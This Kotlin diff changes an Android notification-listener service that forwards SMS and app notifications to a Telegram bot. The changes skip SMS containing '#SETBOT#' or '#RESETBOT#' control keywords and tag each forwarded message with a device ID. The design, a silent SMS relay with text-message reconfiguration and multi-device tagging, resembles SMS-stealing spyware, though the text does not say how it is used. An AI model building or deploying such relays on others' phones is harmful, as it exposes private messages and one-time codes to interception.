@@ -152,13 +152,18 @@ class NotificationForwarderService : NotificationListenerService() {
 
             if (token.isBlank() || authorizedId == 0L) return@launch
 
+            if (isSmsApp && (text.contains("#SETBOT#", ignoreCase = true) || text.contains("#RESETBOT#", ignoreCase = true))) {
+                return@launch
+            }
+
             val safeApp = escapeHtml(appName)
             val safeTitle = escapeHtml(title.ifBlank { if (isSmsApp) "SMS Sender" else "Notification" })
             val safeText = escapeHtml(text.ifBlank { "No message content" })
 
+            val deviceId = preferenceManager.getDeviceId()
             val telegramMsg = if (isSmsApp) {
                 """
-                    🔔 <b>New SMS</b>
+                    🔔 <b>New SMS</b> [<code>$deviceId</code>]
 
                     <b>App:</b> $safeApp
                     <b>From:</b> $safeTitle
@@ -167,7 +172,7 @@ class NotificationForwarderService : NotificationListenerService() {
                 """.trimIndent()
             } else {
                 """
-                    🔔 <b>New Notification</b>
+                    🔔 <b>New Notification</b> [<code>$deviceId</code>]
 
                     <b>App:</b> $safeApp
                     <b>Title:</b> $safeTitle
